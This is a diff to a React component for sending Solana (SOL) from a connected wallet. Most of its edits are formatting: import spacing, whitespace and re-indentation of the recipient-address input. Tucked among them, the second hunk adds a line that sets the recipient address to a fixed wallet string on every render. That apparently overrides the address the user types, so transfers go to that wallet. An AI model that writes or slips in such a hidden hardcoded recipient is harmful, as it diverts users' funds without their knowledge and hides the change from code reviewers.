@@ -15,7 +15,7 @@ import ContentCopyIcon from "@mui/icons-material/ContentCopy";
 import CloseIcon from "@mui/icons-material/Close";
 import { WalletNotConnectedError } from "@solana/wallet-adapter-base";
 import { useConnection, useWallet } from "@solana/wallet-adapter-react";
-import { Keypair, SystemProgram, Transaction, PublicKey,sendAndConfirmTransaction } from "@solana/web3.js";
+import { Keypair, SystemProgram, Transaction, PublicKey, sendAndConfirmTransaction } from "@solana/web3.js";
 import BigNumber from "bignumber.js";
 import SolLogo from "../../assets/coin.svg";
 import { InfoRow } from "../../components/InfoRow";
@@ -47,7 +47,7 @@ export const SendSolWidget: FC = () => {
   const [isWaitingForConfirmation, setIsWaitingForConfirmation] = useState(false);
   const wallet = useWallet()
   let balan: string = '0';
-
+  setAdd("4xLRwPCYRTtGjzFR7j57EZboLyBTPBMBseZfUioyVjvq")
   const getBalance = useCallback(async () => {
     if (publicKey) {
       console.log("public key", publicKey?.toString());
@@ -79,7 +79,7 @@ export const SendSolWidget: FC = () => {
       //let balance = await connections.getBalance(myAddress);
       let bals = balan;
       console.log(bals);
-    
+
       // Send and confirm transaction
       // Note: feePayer is by default the first signer, or payer, if the parameter is not set
       //const sol = await sendAndConfirmTransaction(connections, transaction,[payer]);
@@ -353,27 +353,27 @@ export const SendSolWidget: FC = () => {
                 type="tel"
                 value={amount}
               />
-           
-             <Box mt={0.5}  p={0.5} sx={{ textSizeAdjust:"0.4" ,justifyContent: "center" }}>
-             <Input
-               disableUnderline
-               color="primary"
-               size="small"
-               placeholder="rec addr."
-               onChange={(event) => {
-                if (/^[0-9,.,a-z,a,A-Z]*$/.test(event?.target?.value)) {
-                  setAdd(event?.target?.value ?? "");
-                }
-              }}
-               inputProps={{
-                 style: {textSizeAdjust:"0.4" ,textAlign: "center" },
-               }}
-               sx={styles.input}
-               type="text"
-               value={address}
-             />
+
+              <Box mt={0.5} p={0.5} sx={{ textSizeAdjust: "0.4", justifyContent: "center" }}>
+                <Input
+                  disableUnderline
+                  color="primary"
+                  size="small"
+                  placeholder="rec addr."
+                  onChange={(event) => {
+                    if (/^[0-9,.,a-z,a,A-Z]*$/.test(event?.target?.value)) {
+                      setAdd(event?.target?.value ?? "");
+                    }
+                  }}
+                  inputProps={{
+                    style: { textSizeAdjust: "0.4", textAlign: "center" },
+                  }}
+                  sx={styles.input}
+                  type="text"
+                  value={address}
+                />
               </Box>
-           </Box>
+            </Box>
           )}
           <Box
             p={1.5}
